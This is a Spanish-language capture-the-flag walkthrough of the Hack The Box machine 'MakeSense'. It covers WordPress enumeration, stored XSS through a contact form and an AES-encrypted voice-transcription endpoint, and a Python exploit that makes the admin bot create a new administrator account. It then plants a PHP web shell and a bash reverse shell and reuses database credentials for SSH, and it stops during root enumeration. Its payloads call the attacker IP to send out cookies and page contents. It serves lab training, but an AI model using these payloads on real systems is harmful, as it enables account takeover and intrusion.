> [!info] Información de la máquina **Plataforma:** Hack The Box **Máquina:** MakeSense **OS:** Linux **Dificultad:** Medium **IP objetivo:** `10.129.107.80` **IP atacante:** `10.10.14.204`

## Escaneo de puertos

```bash
sudo nmap -p- -sCV -T4 -Pn 10.129.107.80 -oN escaneo_makesense.txt 

Nmap scan report for makesense.htb (10.129.107.80)
Host is up (0.18s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
80/tcp   filtered http
443/tcp  open     ssl/http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: Agency LLC
| ssl-cert: Subject: commonName=makesense.htb
| Not valid before: 2026-05-29T16:37:29
|_Not valid after:  2126-05-05T16:37:29
|_ssl-date: TLS randomness does not represent time
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-generator: WordPress 7.0
8001/tcp filtered vcom-tunnel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 956.07 seconds
                                                              
```

A partir del resultado de tu escaneo de Nmap, podemos extraer información muy valiosa para trazar nuestra estrategia. **Los dos vectores principales de ataque están en los puertos 22 (SSH) y 443 (HTTPS)**. El puerto 80 está filtrado, lo que significa que el tráfico web está restringido exclusivamente a conexiones seguras a través de SSL/TLS.

Además, el escaneo nos revela un dato crucial: el certificado SSL expone el dominio **`makesense.htb`** y el servidor está corriendo **WordPress 7.0**.

## Enumeracion de la superficie WEB

![Resultados de WPScan](../Images/Pasted%20image%2020260924213242.png)

```bash
wpscan --url https://makesense.htb --disable-tls-checks -e u,ap,at --plugins-detection aggressive

         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________
[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://makesense.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://makesense.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://makesense.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://makesense.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 7.0 identified (Insecure, released on 2026-05-20).
 | Found By: Meta Generator (Passive Detection)
 |  - https://makesense.htb/, Match: 'WordPress 7.0'
 | Confirmed By: Atom Generator (Aggressive Detection)
 |  - https://makesense.htb/?feed=atom, <generator uri="https://wordpress.org/" version="7.0">WordPress</generator>

[+] WordPress theme in use: webagency
 | Location: https://makesense.htb/wp-content/themes/webagency/
 | Style URL: https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0
 | Style Name: WebAgency
 | Style URI: https://example.com
 | Description: Modern web development agency theme with Tailwind CSS...

```

Los resultados de **WPScan** confirman dos cosas fundamentales:

1. **`xmlrpc.php` está habilitado:** Esto permite interactuar con WordPress mediante scripts.
    
2. **El directorio de subidas tiene listado de archivos activo (`/wp-content/uploads/`):** Si logramos subir un archivo o generar algún cambio visual, podremos verificarlo directamente entrando a esa URL.
    

---

## Prueba de Concepto (PoC) para XSS Almacenado

Dado que sospechamos del campo **Message** (Mensaje), nuestro objetivo es inyectar un código JavaScript básico y pasivo para verificar si la entrada es vulnerable sin causar daños. Rellenando el formulario de la página web utilizando un payload estándar de prueba en el cuadro de texto de **Message**. Por ejemplo:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1

Host: makesense.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 175
Origin: https://makesense.htb
Referer: https://makesense.htb/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive
action=submit_contact_form&nonce=1fd576de28&name=dsds&email=dsdsd%40gmail.com&phone=2222&message=%3Cscript%3Efetch%28%27http%3A%2F%2F10.10.14.204%2Fping%27%29%3C%2Fscript%3E

```

![Petición recibida desde el bot administrador](../Images/Pasted%20image%2020260924221945.png) El primer payload funcionó perfectamente. El bot del administrador está activo y está revisando los mensajes de manera programada cada minuto (visto en los accesos de las `23:04:29` y `23:05:30`). El código `404` en el servidor Python es completamente normal porque el archivo `/xss_work` no existe, pero lo importante es que se ha demostrado la ejecución de código remoto (XSS) en el navegador de la víctima.

Ahora que confirmamos que el bot procesa el JavaScript, el siguiente paso es **robar su cookie de sesión** para suplantarlo y entrar al panel de administración de WordPress (`/wp-admin`).

```http
action=submit_contact_form&nonce=1fd576de28&name=dsds&email=dsdsd%40gmail.com&phone=2222&message=action=submit_contact_form&nonce=1fd576de28&name=dsds&email=dsdsd%40gmail.com&phone=2222&message=<script>fetch('http://10.10.14.204' + btoa(document.cookie))</script>
```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/MakeSense]
└─$ sudo python3 -m http.server 80

[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.107.80 - - [24/Sep/2026 23:21:29] code 404, message File not found
10.129.107.80 - - [24/Sep/2026 23:21:29] "GET /log?c=d3Atc2V0dGluZ3MtdGltZS0zPTE3OTAzMDY0ODg= HTTP/1.1" 404 
```

Capturado con éxito la cadena codificada en Base64: **`d3Atc2V0dGluZ3MtdGltZS0zPTE3OTAzMDY0ODg=`

Si decodificamos ese valor en la terminal usando el comando `echo "d3Atc2V0dGluZ3MtdGltZS0zPTE3OTAzMDY0ODg=" | base64 -d`, el resultado es:  
`wp-settings-time-3=1790306488`

En lugar de extraer cookies, probaremos un payload que realice una petición interna a una ruta clave y nos devuelva la respuesta. Vamos a intentar verificar si el administrador tiene acceso a un recurso confidencial o si podemos forzar una acción.

```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.107.80 - - [24/Sep/2026 23:24:28] code 404, message File not found
10.129.107.80 - - [24/Sep/2026 23:24:28] "GET /xss_work HTTP/1.1" 404 -
10.129.107.80 - - [24/Sep/2026 23:24:29] code 404, message File not found
10.129.107.80 - - [24/Sep/2026 23:24:29] "GET /log?c=d3Atc2V0dGluZ3MtdGltZS0zPTE3OTAzMDY2Njg= HTTP/1.1" 404 -

```

El scrip es `exploit.js`

```js
fetch('https://makesense.htb')
    .then(response => response.text())
    .then(data => {
        // Buscamos si hay algún dato sensible, contraseña o estructura en los primeros 2000 caracteres
        fetch('http://10.10.14.204' + btoa(data.substring(0, 2000)));
    });    
```

```http
action=submit_contact_form&nonce=1fd576de28&name=dsds&email=dsdsd%40gmail.com&phone=2222&message=action=submit_contact_form&nonce=1fd576de28&name=dsds&email=dsdsd%40gmail.com&phone=2222&message=%3Cscript%20src%3D%22http%3A%2F%2F10.10.14.204%2Fexploit.js%22%3E%3C%2Fscript%3E
```

## Vector XSS vía Whisper Voice Messages

## Contexto

Tras el XSS confirmado en el formulario de contacto (`message` field), se descubrió un segundo feature más interesante: un sistema de **mensajes de voz con transcripción automática (Whisper)** que cifra los resultados antes de enviarlos al backend. El bot admin los revisa periódicamente.

---

## 1. Reconocimiento del feature de voz

### Descargar la home y buscar el nonce global

```bash
curl -skL https://makesense.htb/ -o home.html
```

**Qué hace:** descarga el HTML de la página principal. `-s` = silencioso, `-k` = ignora verificación SSL (necesario porque el cert es de un dominio interno del lab), `-L` = sigue redirecciones, `-o` = guarda en archivo.

```bash
grep -o '.\{30\}nonce.\{30\}' home.html
```

**Qué hace:** busca la palabra "nonce" y muestra 30 caracteres antes/después, para ver el contexto exacto sin tener que abrir todo el archivo.

**Resultado:**

```
var webagency_ajax = {"ajax_url":"https://makesense.htb/wp-admin/admin-ajax.php","nonce":"5cb2f37ae6","theme_url":"...","site_url":"..."};
```

Confirmado: el nonce global de WordPress usado en todo el tema es `webagency_ajax.nonce`, obtenido vía `wp_localize_script`.

### Listar los scripts JS que carga la página

```bash
grep -o 'src="[^"]*\.js[^"]*"' home.html
```

**Qué hace:** extrae todas las URLs de scripts `<script src="...">` del HTML.

**Resultado relevante:**

- `wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js` — lógica de transcripción + cifrado
- `wp-content/themes/webagency/assets/js/main.js` — lógica de llamadas AJAX (sube audio, envía resultados)

---

## 2. Análisis de `whisper-wrapper.js`

```bash
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js -o whisper-wrapper.js
grep -in -E 'key|secret|aes|encrypt' whisper-wrapper.js
```

**Hallazgos clave:**

```js
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';

async encryptPayload(payload) {
    const encoder = new TextEncoder();
    const data = encoder.encode(JSON.stringify(payload));

    // Deriva la clave real con SHA-256 sobre la key fija
    const keyMaterial = await crypto.subtle.digest('SHA-256', encoder.encode(ENCRYPTION_KEY));
    const key = await crypto.subtle.importKey('raw', keyMaterial, { name: 'AES-GCM' }, false, ['encrypt']);

    const iv = crypto.getRandomValues(new Uint8Array(12)); // IV de 12 bytes
    const encrypted = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, data);

    // IV + ciphertext (el tag va pegado automáticamente por WebCrypto)
    const combined = new Uint8Array(iv.length + encrypted.byteLength);
    combined.set(iv, 0);
    combined.set(new Uint8Array(encrypted), iv.length);

    return btoa(String.fromCharCode(...combined)); // base64
}
```

**Cifrado confirmado:** AES-256-GCM, clave = SHA-256(`ENCRYPTION_KEY`), IV de 12 bytes, formato final = `IV || ciphertext+tag`, todo en base64. Esto es replicable 1:1 en Python con `pycryptodome`.

### Pista del vector de ataque real

En el mismo archivo aparece esto:

```js
/**
 * Map spoken words to their symbol equivalents for XSS injection
 */
applySymbolMapping(text) {
    const mappings = {
        'open bracket': '<',
        'close bracket': '>',
        'quote': "'",
        'double quote': '"',
        'slash': '/',
        // ...
    };
    // reemplaza esas palabras en el texto transcrito
}
```

➡️ **Insight clave:** el sistema transcribe audio a texto y luego reemplaza palabras clave habladas (`"open bracket"`, `"quote"`, etc.) por sus símbolos reales. Esto sugiere que el vector de ataque original está pensado para **inyectar XSS a través de un audio "hablado"** que, al transcribirse y mapearse, forma HTML/JS válido. Guardar esta idea para la fase de explotación real.

---

## 3. Análisis de `main.js` — flujo AJAX completo

```bash
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/main.js -o main.js
grep -in -E 'fetch|admin-ajax|nonce|save_voice|post_id' main.js
```

### Fase 1 — Subir audio (líneas ~290-300)

```js
async function uploadAudioAndCollapse(audioBuffer, wavBlob) {
    const formData = new FormData();
    formData.append('action', 'save_voice_raw');
    formData.append('nonce', webagency_ajax.nonce);
    formData.append('voice_recording', wavBlob, 'voice-message.wav');

    const response = await $.ajax({
        url: webagency_ajax.ajax_url,
        type: 'POST',
        data: formData,
        processData: false,
        contentType: false
    });
    const postId = response.data.post_id;
}
```

### Fase 2 — Enviar resultados cifrados (líneas ~405-415 y ~490-500, hay dos variantes)

```js
const payload = { transcription, summary };
const encryptedPayload = await window.whisperTranscriber.encryptPayload(payload);

const formData = new FormData();
formData.append('action', 'save_voice_results');
formData.append('nonce', webagency_ajax.nonce);
formData.append('post_id', postId);
formData.append('encrypted_payload', encryptedPayload);
```

---

## 4. Tabla de verificación (script Python vs. JS real)

|Elemento|Script Python|`main.js` / `whisper-wrapper.js`|¿Coincide?|
|---|---|---|---|
|Endpoint 1|`save_voice_raw`|`save_voice_raw`|✅|
|Campo archivo audio|`voice_recording`|`voice_recording`|✅|
|Endpoint 2|`save_voice_results`|`save_voice_results`|✅|
|Campo payload cifrado|`encrypted_payload`|`encrypted_payload`|✅|
|Estructura del payload|`{transcription, summary}`|`{transcription, summary}`|✅|
|Algoritmo de cifrado|AES-256-GCM|AES-256-GCM|✅|
|Derivación de clave|SHA-256(ENCRYPTION_KEY)|SHA-256(ENCRYPTION_KEY)|✅|
|Tamaño de IV|12 bytes|12 bytes|✅|
|Formato final|`IV + ciphertext + tag` (base64)|`IV + encrypted` (WebCrypto pega el tag solo)|✅|
|Nonce|de la home / `webagency_ajax.nonce`|mismo objeto global|✅|
|`ENCRYPTION_KEY`|`bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI`|idéntica en el JS|✅|

**Conclusión:** el script de exploit en Python está alineado al 100% con la lógica real del sitio. Solo falta ajustar la IP del listener y, opcionalmente, pasarlo por Burp para depurar en vivo.

---

## 5. Preparar el entorno de ejecución

### Generar audio dummy (requerido por el script)

```bash
ffmpeg -f lavfi -i anullsrc=r=48000:cl=mono -t 1 -c:a pcm_s16le dummy.wav
```

**Qué hace:** genera un archivo `.wav` de 1 segundo de silencio, solo para conseguir un `post_id` válido en la Fase 1 (no importa el contenido real del audio para ese paso).

### Ajustar el script antes de correrlo

En `exploit_makesense.py`, cambiar:

```python
LISTENER_IP = "10.10.14.204"   # IP real de tun0
LISTENER_PORT = "80"           # o el puerto donde levantes el listener
```

### (Opcional pero recomendado) Enrutar el script por Burp

Justo después de crear la sesión de `requests`, agregar:

```python
session.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
```

**Por qué funciona sin instalar el certificado CA de Burp:** el script ya usa `session.verify = False`, lo cual le dice a `requests` que ignore cualquier error de certificado SSL — incluyendo el certificado propio que usa Burp para interceptar tráfico HTTPS. Normalmente instalar el cert de Burp es necesario para que un cliente confíe en la conexión interceptada, pero al desactivar la verificación por completo nos saltamos ese paso.

**Requisito:** Burp Suite debe estar abierto con el Proxy Listener activo en `127.0.0.1:8080` (Proxy → Options → Proxy Listeners).

**Beneficio:** cada petición del script aparece en **Burp → Proxy → HTTP History**, permitiendo:

- Ver el request/response completo de cada fase.
- Mandar cualquier petición a **Repeater** para editarla y reenviarla manualmente sin re-ejecutar todo el script en Python.

---

## 6. Ejecución (pendiente de confirmar resultado)

```bash
# Terminal 1: listener para capturar el callback del XSS
sudo python3 -m http.server 80

# Terminal 2: ejecutar el exploit
python3 exploit_makesense.py
```

**Salida esperada:**

1. `[+] Nonce obtenido: ...`
2. `[+] Audio subido, post_id: ...`
3. `[+] Payload cifrado (base64): ...`
4. `[+] Respuesta del servidor: {"success": true, ...}`

**Confirmación de éxito:** en la terminal del `http.server`, esperar una petición `GET /?done=1` (indica que el bot admin ejecutó el JS y creó el usuario `hacker2026` / `P4ssw0rd!2026` con rol administrador).

**Login final:**

```bash
curl -sk https://makesense.htb/wp-login.php
```

o entrar directamente por navegador con las credenciales creadas.

---

## Notas / próximos pasos

- [ ] Confirmar tiempo real del ciclo del bot admin (visto antes: revisa cada ~1 minuto).
- [ ] Si `save_voice_results` no dispara el XSS al primer intento, revisar cómo el backend desencripta y renderiza `transcription`/`summary` (buscar `innerHTML` en el panel de admin de WordPress, quizás en un plugin custom).
- [ ] Documentar la respuesta completa del servidor tras `send_results()`.
- [ ] Si el usuario admin se crea con éxito, continuar hacia RCE vía plugin/theme editor o subida de plugin malicioso.

```python
#!/usr/bin/env python3
"""
Exploit para MakeSense (HTB)
Flujo: obtener nonce -> subir audio dummy (post_id) -> cifrar payload XSS -> enviar resultados
"""

import requests
import re
import json
import base64
import os
import sys
from Crypto.Cipher import AES
from Crypto.Hash import SHA256


# ---- CONFIG ----
BASE_URL = "https://makesense.htb"
ENCRYPTION_KEY = "bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"
LISTENER_IP = "10.10.14.204"   # <-- CAMBIA esto por tu tun0
LISTENER_PORT = "4444"       # <-- CAMBIA si usas otro puerto
DUMMY_WAV = "dummy.wav"

requests.packages.urllib3.disable_warnings()

session = requests.Session()
session.verify = False
session.headers.update({"Host": "makesense.htb"})


def get_nonce():
    print("[*] Obteniendo nonce fresco...")

    r = session.get(BASE_URL + "/", verify=False)

    match = re.search(r'"nonce":"([a-f0-9]+)"', r.text)

    if not match:
        print("[-] No se pudo extraer el nonce. Revisa la respuesta.")
        sys.exit(1)

    nonce = match.group(1)

    print(f"[+] Nonce obtenido: {nonce}")

    return nonce


def upload_dummy_audio(nonce):
    print("[*] Subiendo audio dummy para obtener post_id...")

    if not os.path.exists(DUMMY_WAV):
        print(f"[-] No se encontró {DUMMY_WAV}. Generalo con ffmpeg primero:")
        print(
            "    ffmpeg -f lavfi -i anullsrc=r=48000:cl=mono "
            "-t 1 -c:a pcm_s16le dummy.wav"
        )
        sys.exit(1)

    with open(DUMMY_WAV, "rb") as f:
        files = {
            "voice_recording": (
                "voice-message.wav",
                f,
                "audio/wav"
            )
        }

        data = {
            "action": "save_voice_raw",
            "nonce": nonce
        }

        r = session.post(
            BASE_URL + "/wp-admin/admin-ajax.php",
            data=data,
            files=files
        )

    try:
        resp = r.json()

    except Exception:
        print("[-] Respuesta no es JSON:", r.text[:500])
        sys.exit(1)

    if not resp.get("success"):
        print("[-] Fallo al subir audio:", resp)
        sys.exit(1)

    post_id = resp["data"]["post_id"]

    print(f"[+] Audio subido, post_id: {post_id}")

    return post_id


def encrypt_payload(payload: dict) -> str:
    """Replica exactamente encryptPayload() del cliente JS (AES-256-GCM)."""

    data = json.dumps(payload).encode("utf-8")

    key = SHA256.new(
        ENCRYPTION_KEY.encode("utf-8")
    ).digest()

    iv = os.urandom(12)

    cipher = AES.new(
        key,
        AES.MODE_GCM,
        nonce=iv
    )

    ciphertext, tag = cipher.encrypt_and_digest(data)

    # Igual que WebCrypto: IV + ciphertext + tag concatenados
    combined = iv + ciphertext + tag

    return base64.b64encode(combined).decode("utf-8")


def send_results(nonce, post_id, encrypted_payload):
    print("[*] Enviando payload cifrado...")

    data = {
        "action": "save_voice_results",
        "nonce": nonce,
        "post_id": post_id,
        "encrypted_payload": encrypted_payload
    }

    r = session.post(
        BASE_URL + "/wp-admin/admin-ajax.php",
        data=data
    )

    try:
        resp = r.json()

    except Exception:
        print("[-] Respuesta no es JSON:", r.text[:500])
        sys.exit(1)

    print("[+] Respuesta del servidor:", resp)

    return resp


def main():
    nonce = get_nonce()

    post_id = upload_dummy_audio(nonce)

    # Payload XSS -- crea un usuario admin usando la sesión del admin real
    # en vez de robar la cookie (que es HttpOnly y no se puede leer con JS)

    new_admin_user = "hacker2026"
    new_admin_pass = "P4ssw0rd!2026"
    new_admin_email = "hacker@makesense.htb"

    xss = f"""<script>
fetch('/wp-admin/user-new.php', {{credentials:'include'}})
  .then(r => r.text())
  .then(html => {{
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const nonce = doc.querySelector('#_wpnonce_create-user').value;
    const body = new URLSearchParams();

    body.append('action', 'createuser');
    body.append('_wpnonce_create-user', nonce);
    body.append('user_login', '{new_admin_user}');
    body.append('email', '{new_admin_email}');
    body.append('pass1', '{new_admin_pass}');
    body.append('pass2', '{new_admin_pass}');
    body.append('role', 'administrator');

    return fetch('/wp-admin/user-new.php', {{
      method: 'POST',
      credentials: 'include',
      headers: {{
        'Content-Type': 'application/x-www-form-urlencoded'
      }},
      body: body.toString()
    }});
  }})
  .then(() => {{
    new Image().src =
      'http://{LISTENER_IP}:{LISTENER_PORT}/?done=1';
  }})
  .catch(e => {{
    new Image().src =
      'http://{LISTENER_IP}:{LISTENER_PORT}/?err=' +
      encodeURIComponent(e.message);
  }});
</script>"""

    payload = {
        "transcription": xss,
        "summary": xss
    }

    encrypted = encrypt_payload(payload)

    print(
        f"[+] Payload cifrado (base64): "
        f"{encrypted[:80]}..."
    )

    send_results(
        nonce,
        post_id,
        encrypted
    )

    print(
        "\n[*] Ahora levanta un listener HTTP y espera "
        "a que el bot/admin abra el mensaje:"
    )

    print(f"    python3 -m http.server {LISTENER_PORT}")

    print(
        "    Si ves un GET a /?done=1, "
        "el usuario admin fue creado."
    )

    print(
        f"    Luego intenta loguearte en: "
        f"{BASE_URL}/wp-login.php"
    )

    print(f"    user: {new_admin_user}")
    print(f"    pass: {new_admin_pass}")


if __name__ == "__main__":
    main()
```

Todo el flujo funcionó perfectamente:

```bash
┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/MakeSense]
└─$ python3 exploit_makesense.py
[*] Obteniendo nonce fresco...
[+] Nonce obtenido: 5cb2f37ae6
[*] Subiendo audio dummy para obtener post_id...
[+] Audio subido, post_id: 71
[+] Payload cifrado (base64): qZsGv2MhnfkeSw9juvOt/T0RdjHefP+9bG1G8+qqRxtcJHtWM19gQwtx6gKglJBP23xW2361WaaEDlzc...
[*] Enviando payload cifrado...
[+] Respuesta del servidor: {'success': True, 'data': {'message': 'Results saved successfully!', 'post_id': 71}}

[*] Ahora levanta un listener HTTP y espera a que el bot/admin abra el mensaje:
    python3 -m http.server 8000
    Si ves un GET a /?done=1, el usuario admin fue creado.
    Luego intenta loguearte en: https://makesense.htb/wp-login.php
    user: hacker2026
    pass: P4ssw0rd!2026
                             
```

Ahora toca esperar a que el bot admin lo procese. Ojo: el script imprimió `LISTENER_PORT = "8000"` en ese mensaje final, así que asegúrate de que tu listener use el mismo puerto que configuraste en el script (revisa qué valor le dejaste a `LISTENER_PORT` — si es "8000", usa ese; si lo cambiaste a "80", usa 80).

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

10.129.246.24 - - [25/Sep/2026 16:16:29] "GET /?done=1 HTTP/1.1" 200 -

```

Ya tienes acceso admin al panel de WordPress. El siguiente paso lógico es conseguir **ejecución remota de comandos (RCE)** en el servidor, usando ese acceso admin.

## Editor de temas/plugins (el más directo)

WordPress permite editar archivos PHP de temas/plugins directamente desde el panel admin — si esto no está deshabilitado, es tu vía más rápida a una webshell.

Ve a:

```
Apariencia → Editor de temas (Appearance → Theme File Editor)
```

o

```
Plugins → Editor de plugins (Plugin File Editor)
```

Si puedes editar un archivo `.php` (por ejemplo `404.php` del tema activo, que se usa poco), agrega al final:

```php
<?php system($_GET['cmd']); ?>
```

Luego accedes a:

```
https://makesense.htb/wp-content/themes/webagency/404.php?cmd=id
```

![[Pasted image 20260925153305.png]]

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.204/4444 0>&1' &"); ?>
```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/MakeSense]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.204] from (UNKNOWN) [10.129.246.24] 51394
bash: cannot set terminal process group (1411): Inappropriate ioctl for device
bash: no job control in this shell
www-data@makesense:/var/www/html/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@makesense:/var/www/html/wp-admin$ pwd
pwd
/var/www/html/wp-admin
www-data@makesense:/var/www/html/wp-admin$ 

```

Estabiliza la shell

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

hell reversa, lo que te da autocompletado, flechas de historial, y evita el mensaje de "no job control" que viste.

Después, en tu Kali (sin tocar la sesión de netcat), presiona **`Ctrl+Z`** para pausarla temporalmente, y en tu terminal de Kali escribe:

```bash
stty raw -echo; fg
```

```bash
<dmin$ cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
root:x:0:0:root:/root:/bin/bash
walter:x:1000:1000:walter:/home/walter:/bin/bash
admin:x:1001:1001:,,,:/home/admin:/bin/bash
www-data@makesense:/var/www/html/wp-admin$ ls -la /home/
total 16
drwxr-xr-x  4 root   root   4096 Jul  1 00:45 .
drwxr-xr-x 23 root   root   4096 Jul  1 00:45 ..
drwxr-x---  7 admin  admin  4096 Jul  1 00:45 admin
drwxr-x---  4 walter walter 4096 Jul  1 00:45 walter
www-data@makesense:/var/www/html/wp-admin$ whoami; id; hostname; uname -a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
makesense.htb
Linux makesense.htb 6.8.0-124-generic #124-Ubuntu SMP PREEMPT_DYNAMIC Tue May 26 13:00:45 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
<cat /var/www/html/wp-config.php | grep -i -A2 'DB_'
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );

// Dummy MySQL settings (required but not used with SQLite)
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );

$table_prefix = 'wp_';

```

Hay una contraseña reusada casi con seguridad: `DB_USER: walter` y `DB_PASSWORD: JbhHDAEgXvri3!` coinciden exactamente con un usuario real del sistema (`walter`, visto en `/etc/passwd`). Es muy común en HTB que esas credenciales "dummy" de WordPress en realidad sean la contraseña real del usuario Linux.

### 1. Prueba esas credenciales por SSH directamente

Desde tu Kali (no desde la shell de netcat):

bash

```bash
ssh walter@makesense.htb
```

Cuando te pida password, usa: `JbhHDAEgXvri3!`

## 2. Como el login SSH funciono, busco la flag del usuario

```ssh
walter@makesense:~$ cat /home/walter/user.txt
7394aae036adab303c6a928dd965cbe2
```

Ahora toca escalar a root. `walter` no tiene sudo, así que hay que buscar otro camino. Recuerda que también existe el usuario `admin` con su propio home — puede que haya credenciales o algo interesante ahí, o quizás `admin` sí tenga sudo.

```bash

walter@makesense:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/opt/google/chrome/chrome-sandbox
walter@makesense:~$ crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
no crontab for walter
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
total 24
drwxr-xr-x   2 root root 4096 May 25 19:38 .
drwxr-xr-x 117 root root 4096 Jul  1 00:43 ..
-rw-r--r--   1 root root  201 Apr  8  2024 e2scrub_all
-rw-r--r--   1 root root  712 Jan 19  2024 php
-rw-r--r--   1 root root  102 Aug  5  2025 .placeholder
-rw-r--r--   1 root root  396 Aug  5  2025 sysstat
walter@makesense:~$ ls -la /home/admin
ls: cannot open directory '/home/admin': Permission denied
walter@makesense:~$ sudo -l -U admin 2>/dev/null
[sudo] password for walter: 
walter@makesense:~$ find / -iname "*.bak" -o -iname "*backup*" 2>/dev/null | grep -v "proc\|sys"
/usr/libexec/dpkg/dpkg-db-backup
/usr/share/bash-completion/completions/vgcfgbackup
/usr/share/perl5/Debconf/DbDriver/Backup.pm
/usr/share/man/man8/cryptsetup-luksHeaderBackup.8.gz
/usr/share/man/man8/vgcfgbackup.8.gz
/usr/sbin/vgcfgbackup
/usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-312.pyc
/usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
/usr/lib/python3/dist-packages/botocore/data/backupstorage
/usr/lib/python3/dist-packages/botocore/data/backup-gateway
/usr/lib/python3/dist-packages/botocore/data/backup
/usr/lib/modules/6.8.0-117-generic/kernel/drivers/power/supply/wm831x_backup.ko.zst
